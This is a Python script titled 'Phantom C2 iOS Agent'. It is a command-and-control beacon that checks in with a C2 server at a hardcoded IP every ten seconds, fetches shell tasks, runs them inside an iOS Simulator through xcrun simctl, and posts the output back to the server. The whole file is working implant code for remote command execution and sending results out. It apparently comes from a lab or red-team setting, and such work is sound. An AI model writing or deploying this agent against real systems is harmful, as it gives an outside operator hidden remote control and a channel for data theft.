#!/usr/bin/env python3
"""Phantom C2 iOS Agent — runs on the Mac, executes commands inside the
iOS Simulator via xcrun simctl spawn."""

import json
import subprocess
import time
import urllib.request
import sys
import os

C2 = "http://192.168.1.72:8080"
AGENT_ID = "e4314a94-31ab-42a8-9fc4-5f6e6ef3b9a3"
SIM = "67073574-46B9-4336-9514-EB3CB13A3ECE"
LOG = "/tmp/ios_agent.log"

def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")

def checkin(results=None):
    body = {"agent_id": AGENT_ID}
    if results:
        body["results"] = results
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        f"{C2}/api/v1/mobile/checkin",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=15)
        return json.loads(resp.read())
    except Exception as e:
        log(f"Checkin error: {e}")
        return {}

def execute_in_sim(cmd):
    """Execute a command inside the iOS simulator."""
    try:
        full_cmd = f"export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin; {cmd}"
        result = subprocess.run(
            ["xcrun", "simctl", "spawn", SIM, "/bin/sh", "-c", full_cmd],
            capture_output=True, text=True, timeout=30
        )
        output = result.stdout
        if result.stderr:
            output += result.stderr
        return output.strip()
    except subprocess.TimeoutExpired:
        return "Command timed out (30s)"
    except Exception as e:
        return f"Error: {e}"

def main():
    log(f"iOS agent started — C2: {C2}, SIM: {SIM}")

    while True:
        try:
            resp = checkin()
            tasks = resp.get("tasks") or []

            results = []
            for task in tasks:
                task_type = task.get("type", "")
                command = task.get("command", "")
                task_id = task.get("id", "")

                if not task_id:
                    continue

                log(f"Task {task_id[:8]}: {task_type} -> {command}")

                if task_type == "shell":
                    output = execute_in_sim(command)
                else:
                    output = f"Unknown task type: {task_type}"

                log(f"  Output ({len(output)} bytes): {output[:100]}...")

                results.append({
                    "task_id": task_id,
                    "output": output,
                    "error": ""
                })

            # Send results if we have any
            if results:
                checkin(results=results)
                log(f"Sent {len(results)} result(s)")

        except Exception as e:
            log(f"Loop error: {e}")

        time.sleep(10)

if __name__ == "__main__":
    main()
